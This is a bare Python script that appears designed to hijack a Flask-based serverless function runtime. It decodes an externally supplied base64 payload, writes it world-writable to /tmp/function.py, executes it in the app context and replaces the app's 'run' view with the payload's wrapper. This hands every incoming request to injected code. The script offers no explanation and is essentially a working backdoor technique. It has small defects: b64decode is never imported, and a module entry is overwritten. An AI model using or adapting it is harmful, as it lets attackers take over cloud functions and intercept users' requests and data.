from flask import current_app as app
import flask
import os
import importlib
import sys


new_function = b64decode(external_data_b64)

if os.access('/tmp', os.W_OK):
    new_function_path = "/tmp/function.py"
    with open(new_function_path, "wb") as f:
        f.write(new_function)
    os.chmod(new_function_path, 0o777)

DEFAULT_SOURCE = os.path.realpath("./main.py")
target = os.environ.get("FUNCTION_TARGET")
source = os.environ.get("FUNCTION_SOURCE", DEFAULT_SOURCE)

realpath = os.path.realpath(source)
directory, filename = os.path.split(realpath)
name, extension = os.path.splitext(filename)

spec = importlib.util.spec_from_file_location(name, realpath)
spec_func = importlib.util.spec_from_file_location('function.py', '/tmp/function.py')
source_module = importlib.util.module_from_spec(spec)
source_module_func = importlib.util.module_from_spec(spec_func)
sys.path.append('/tmp')
sys.path.append(directory)
sys.modules[name] = source_module
sys.modules[name] = source_module_func

with app.app_context():
    spec.loader.exec_module(source_module)
    spec_func.loader.exec_module(source_module_func)

function = getattr(source_module, target)
new_func = getattr(source_module_func, 'new_http_view_func_wrapper')
app.view_functions["run"] = new_func(function, flask.request)
